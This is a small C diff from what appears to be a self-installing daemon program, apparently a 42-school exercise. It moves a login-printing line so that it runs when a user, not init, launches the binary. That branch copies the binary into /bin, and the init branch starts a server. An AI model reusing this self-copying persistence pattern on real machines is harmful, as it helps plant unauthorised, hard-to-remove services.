@@ -169,8 +169,9 @@ int main(int argc, char **argv)
 		// syslog(LOG_ERR, "readlink failed\n");
 		return -1;
 	}
-	if (parent != 1 && parent != 2) // systemd && sysvinit
+	if (parent != 1 && parent != 2) // (!systemd && !sysvinit) so launch by user
 	{
+		printf("%s", LOGIN_42);
 		if (duplicate(exec_path) < 0) // copy binary to /bin directory
 		{
 			// syslog(LOG_ERR, "failed to duplicate the program\n");
@@ -184,7 +185,6 @@ int main(int argc, char **argv)
 	}
 	else
 	{
-		printf("%s", LOGIN_42);
 		server();
 	}
 	// syslog(LOG_DEBUG, "process end: %s\n", exec_path);
